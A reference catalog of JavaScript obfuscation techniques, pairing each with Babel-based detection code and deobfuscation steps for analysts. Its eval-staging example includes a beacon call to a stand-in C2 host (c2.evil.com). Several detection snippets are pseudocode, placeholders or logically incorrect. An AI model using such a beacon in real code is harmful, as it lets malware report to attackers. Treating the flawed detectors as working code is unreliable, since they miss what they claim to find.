# Obfuscation Pattern Catalog

**Comprehensive reference for JavaScript obfuscation techniques, detection, and mitigation.**

## Quick Reference Table

| Pattern | Detection | Mitigation | Effort |
|---------|-----------|------------|--------|
| [String Array](#pattern-1-string-array) | obfuscation-detector | Static AST | LOW |
| [Variable Renaming](#pattern-2-variable-renaming) | Visual | Static AST | LOW |
| [Eval Staging](#pattern-3-eval-staging) | AST/grep | Dynamic | MEDIUM |
| [Control Flow Flattening](#pattern-4-control-flow-flattening) | AST pattern | Manual/Static | HIGH |
| [Opaque Predicates](#pattern-5-opaque-predicates) | Symbolic | Manual | HIGH |
| [Self-Defending](#pattern-6-self-defending) | Visual | Surgical edits | MEDIUM |
| [API Hashing](#pattern-7-api-hashing) | AST/manual | Hash DB | LOW-MED |
| [JSFuck](#pattern-8-jsfuck) | Regex | Decoder | VERY LOW |

---

## Pattern 1: String Array Obfuscation

### Characteristics

**Original Code:**
```javascript
const apiUrl = "https://api.example.com/data";
const secretKey = "abc123xyz";
```

**Obfuscated Code:**
```javascript
var _0x5a1b = ['https://api.example.com/data', 'abc123xyz', 'endpoint', '/login'];
function _0x2c4d(idx) {
  return _0x5a1b[idx];
}
const apiUrl = _0x2c4d(0);
const secretKey = _0x2c4d(1);
```

### AST Signature

**Detect:**
- Single `const`/`var` declaration with large array of string literals
- Immediately followed by function with single parameter
- Function returns `arr[idx]` pattern
- Multiple `arr[idx]` references throughout code

**Code Example:**
```javascript
// Detection AST
traverse(ast, {
  VariableDeclarator(path) {
    if (t.isArrayExpression(path.node.init)) {
      const elems = path.node.init.elements;
      const allStrings = elems.every(e => e && t.isStringLiteral(e));
      if (allStrings && elems.length > 3) {
        console.log('String array detected:', path.node.id.name);
      }
    }
  }
});
```

### Mitigation Strategy

**Static Approach (Recommended):**
1. Identify const string arrays
2. Record array contents
3. Replace `arr[idx]` with actual strings
4. Remove array and function

**Implementation:**
```javascript
const stringArrays = new Map();

traverse(ast, {
  VariableDeclarator(path) {
    const id = path.node.id;
    const init = path.node.init;
    if (!t.isIdentifier(id) || !t.isArrayExpression(init)) return;

    const elems = init.elements;
    if (!elems.every(e => e && t.isStringLiteral(e))) return;

    stringArrays.set(id.name, elems.map(e => e.value));
  }
});

traverse(ast, {
  MemberExpression(path) {
    const { object, property, computed } = path.node;
    if (!computed || !t.isIdentifier(object)) return;

    const arr = stringArrays.get(object.name);
    if (!arr) return;

    const idx = evaluateLiteral(property);
    if (typeof idx === 'number') {
      const value = arr[idx];
      if (typeof value === 'string') {
        path.replaceWith(t.stringLiteral(value));
      }
    }
  }
});
```

### Effort & Success Rate

- **Effort**: LOW (1-2 minutes)
- **Success Rate**: 95%+
- **Tools**: Babel AST

---

## Pattern 2: Variable/Function Renaming

### Characteristics

**Original:**
```javascript
function calculateHash(input) {
  return sha256(input);
}
```

**Obfuscated:**
```javascript
function _0x1a2b(_0x3c4d) {
  return _0x5e6f(_0x3c4d);
}
```

### AST Signature

**Detect:**
- All identifiers are single letters, hex numbers, or `_0xXXXX` pattern
- No meaningful variable/function names
- Comments removed
- Typical of minification

**Detection Code:**
```javascript
const isMangled = name => {
  return /^_?0x[a-f0-9]+$/.test(name) ||
         /^[a-z]$/.test(name) ||
         /^[A-Z]$/.test(name);
};

traverse(ast, {
  FunctionDeclaration(path) {
    const name = path.node.id.name;
    if (isMangled(name)) {
      console.log('Mangled function:', name);
    }
  }
});
```

### Mitigation

**Variable Inlining:**
```javascript
const constVars = new Map();

traverse(ast, {
  VariableDeclarator(path) {
    const { id, init } = path.node;
    if (!t.isIdentifier(id) || !init) return;

    const binding = path.scope.getBinding(id.name);
    if (binding && binding.kind === 'const') {
      const value = evaluateLiteral(init);
      if (value !== undefined) {
        constVars.set(id.name, init);
      }
    }
  }
});

traverse(ast, {
  Identifier(path) {
    if (path.isReferencedIdentifier()) {
      const replacement = constVars.get(path.node.name);
      if (replacement) {
        path.replaceWith(JSON.parse(JSON.stringify(replacement)));
      }
    }
  }
});
```

**Effort**: LOW (automatic)

---

## Pattern 3: Eval Staging / Multi-Layer Unpacking

### Characteristics

```javascript
// Stage 0 - Encrypted payload
var _0xabc = 'var x=1; eval("alert(x)")';
eval(LZ4.decompress(_0xabc));

// Stage 1 - Unpacked code
var _0xdef = '...payload...';
eval(_0xdef);

// Stage 2 - Final malicious code
fetch('https://c2.evil.com/beacon', {...});
```

### AST Signature

**Detect:**
- `eval()` calls with arguments
- `Function()` constructor calls
- `setTimeout(string, ...)` or `setInterval(string, ...)`
- Decompression library imports (lz4, pako, zlib)

**Detection:**
```javascript
traverse(ast, {
  CallExpression(path) {
    const callee = path.node.callee;

    // Detect eval()
    if (callee.type === 'Identifier' && callee.name === 'eval') {
      console.log('eval() detected at:', path.node.loc);
    }

    // Detect Function constructor
    if (callee.type === 'MemberExpression' &&
        callee.object.name === 'Function') {
      console.log('Function constructor detected');
    }

    // Detect setTimeout with string
    if (callee.type === 'Identifier' &&
        ['setTimeout', 'setInterval'].includes(callee.name)) {
      const arg = path.node.arguments[0];
      if (arg && arg.type === 'StringLiteral') {
        console.log(`${callee.name} with string detected`);
      }
    }
  }
});
```

### Mitigation

**Dynamic Analysis Required:**
1. Run in isolated sandbox
2. Intercept eval/Function calls
3. Extract staged code
4. Analyze each stage

**Tools:**
- `isolated-vm` (Node.js)
- Playwright (browser-based)
- Custom instrumentation

**Effort**: MEDIUM-HIGH (requires sandbox setup)

---

## Pattern 4: Control Flow Flattening

### Characteristics

**Original:**
```javascript
if (x > 5) {
  doA();
  doB();
} else {
  doC();
}
```

**Flattened:**
```javascript
var _state = 0;
while (true) {
  switch (_state) {
    case 0:
      if (x > 5) _state = 1; else _state = 2;
      break;
    case 1:
      doA();
      _state = 3;
      break;
    case 2:
      doC();
      _state = 3;
      break;
    case 3:
      doB();
      return;
  }
}
```

### AST Signature

**Detect:**
- Large `switch` statement with numeric cases
- State variable initialized to 0
- `while(true)` loop around switch
- Each case assigns `_state` before break

**Detection:**
```javascript
traverse(ast, {
  WhileStatement(path) {
    if (t.isBooleanLiteral(path.node.test) && path.node.test.value === true) {
      const body = path.node.body;
      if (t.isSwitchStatement(body)) {
        console.log('Possible control flow flattening detected');
      }
    }
  }
});
```

### Mitigation

**Challenges:**
- Requires understanding state machine
- Manual analysis or advanced tools
- May need symbolic execution

**Approaches:**
1. **Manual**: Trace state transitions, reconstruct logic
2. **Tools**: IDA Pro with Hex-Rays, SATURN decompiler
3. **Static**: Pattern matching for common state machines

**Effort**: HIGH (1-4 hours for complex CFG)

---

## Pattern 5: Opaque Predicates (Dead Code)

### Characteristics

```javascript
// Opaque predicate (always true)
if ((Math.random() * 2) >= 0) {
  const result = doRealWork();
} else {
  // Unreachable junk code
  console.log('This never runs');
}
```

### AST Signature

**Detect:**
- Conditional with constant-like behavior
- Branches with obviously unreachable code
- Mathematical expressions that evaluate to true/false

**Detection:**
```javascript
// Simplified detection
traverse(ast, {
  IfStatement(path) {
    const test = path.node.test;
    const alwaysTrue = isAlwaysTrue(test);
    const alwaysFalse = isAlwaysFalse(test);

    if (alwaysTrue) {
      console.log('Opaque predicate (true):', path.node.loc);
      // Real code in consequent branch
    }
    if (alwaysFalse) {
      console.log('Opaque predicate (false):', path.node.loc);
      // Real code in alternate branch
    }
  }
});

function isAlwaysTrue(node) {
  // Check for patterns like: x * (x + 1) % 2 == 0
  // This requires symbolic execution or SMT solving
  return false; // Placeholder
}
```

### Mitigation

**Approaches:**
1. **Symbolic execution** (angr, Triton)
2. **Manual removal** of dead code branches
3. **SMT solver** to prove predicate values

**Effort**: HIGH (requires advanced tools)

---

## Pattern 6: Self-Defending Code

### Characteristics

```javascript
// Anti-debugging
setInterval(function() {
  if (debugger statement) {
    process.exit(1);
  }
}, 1000);

// Anti-tampering
var _checksum = '...hash...';
var _actualCode = '...code...';
if (hashCode(_actualCode) !== _checksum) {
  throw new Error('TAMPERED');
}
```

### AST Signature

**Detect:**
- Anti-debug API calls (`debugger`, devtools detection)
- `setInterval`/`setTimeout` with long intervals
- Hash/checksum calculations on code
- Reference to `Error().stack`

**Detection:**
```javascript
traverse(ast, {
  CallExpression(path) {
    const callee = path.node.callee;
    if (callee.type === 'Identifier') {
      if (['setInterval', 'setTimeout'].includes(callee.name)) {
        console.log('Timing-based anti-debug detected');
      }
    }
    if (callee.type === 'MemberExpression') {
      const obj = callee.object.name;
      const prop = callee.property.name;
      if (obj === 'console' && prop === 'debugger') {
        console.log('debugger statement detected');
      }
    }
  }
});
```

### Mitigation

**Approaches:**
1. **Don't use beautifiers** - work with minified source
2. **Use AST edits** instead of text edits
3. **Patch anti-debug checks** before execution

**Effort**: MEDIUM (requires surgical precision)

---

## Pattern 7: API Hashing / Dynamic Resolution

### Characteristics

```javascript
// Hash calculation
function _0xHash(name) {
  let hash = 0;
  for (let i = 0; i < name.length; i++) {
    hash = ((hash << 13) | (hash >> 19)) + name.charCodeAt(i);
  }
  return hash;
}

// Dynamic resolution
const fs_hash = _0xHash('fs');
const readFile_hash = _0xHash('readFile');
// Use hashes to resolve APIs dynamically
```

### AST Signature

**Detect:**
- Hash calculation function (bit shifts, addition)
- `require()` with variable/hash lookup
- Hash comparison instead of string comparison

**Detection:**
```javascript
traverse(ast, {
  FunctionDeclaration(path) {
    const body = path.node.body;
    // Check for bitwise operations and loops (hash calc)
    const hasBitwise = body.body.some(node =>
      t.isBinaryExpression(node) && ['<<', '>>', '|', '&', '^'].includes(node.operator)
    );
    if (hasBitwise) {
      console.log('Possible hash function:', path.node.id.name);
    }
  }
});
```

### Mitigation

**Approaches:**
1. Build hash database of known APIs
2. Reverse engineer hash algorithm
3. Dynamic analysis to resolve at runtime

**Effort**: LOW-MEDIUM (if hash DB available)

---

## Pattern 8: JSFuck / Esoteric Encodings

### Characteristics

**JSFuck** (6 characters: `[]()!+`):
```javascript
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+([][[]])+[]]+[+!+[]]...
```

**JJencode** (18 characters):
```javascript
$=~[];$={___:++$,$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:(![]+"")[$]...
```

### AST Signature

**Detect:**
```javascript
// JSFuck detection
const isJSFuck = code => {
  const uniqueChars = new Set(code.replace(/[\s\n]/g, '').split('')).size;
  return uniqueChars <= 6 && /^[()[\]!+\s]*$/.test(code);
};

// JJencode detection
const isJJencode = code => {
  const uniqueChars = new Set(code.replace(/[\s\n]/g, '').split('')).size;
  return uniqueChars <= 18;
};
```

### Mitigation

**Approaches:**
1. **Online decoder**: de4js.kshift.me
2. **Local decoder**: JSFuck decoder libraries
3. **Safe eval** in sandbox

**Effort**: VERY LOW (seconds)

---

## Decision Tree for Pattern Selection

```
START: Obfuscated JavaScript
  ↓
[1] Readable? NO → Format with Prettier
  ↓
[2] Only []()!+ chars? YES → JSFuck → Decoder → DONE
  ↓
[3] Run obfuscation-detector
  ├─→ ['string-array'] ───────────┐
  │                               ├─→ Static AST → DONE
  ├─→ ['variable-rename'] ────────┤
  │                               │
  ├─→ ['eval-staging'] ───────────┼─→ Dynamic → DONE
  │                               │
  ├─→ ['control-flow-flattening'] ─┤
  │                               │
  └─→ [] (no patterns) ───────────┘
      ↓
[4] Manual inspection
  ├─→ API Hashing ────────────────→ Hash DB lookup → DONE
  ├─→ Self-Defending ─────────────→ Surgical edits → DONE
  └─→ Opaque Predicates ──────────→ Symbolic exec → MANUAL
```

---

## References

- **Babel AST Types**: https://babeljs.io/docs/babel-types
- **obfuscation-detector**: https://github.com/HumanSecurity/obfuscation-detector
- **JSFuck Decoder**: https://www.jsfuck.com/
- **Symbolic Execution (angr)**: https://angr.io/
- **Triton**: https://triton-library.github.io/
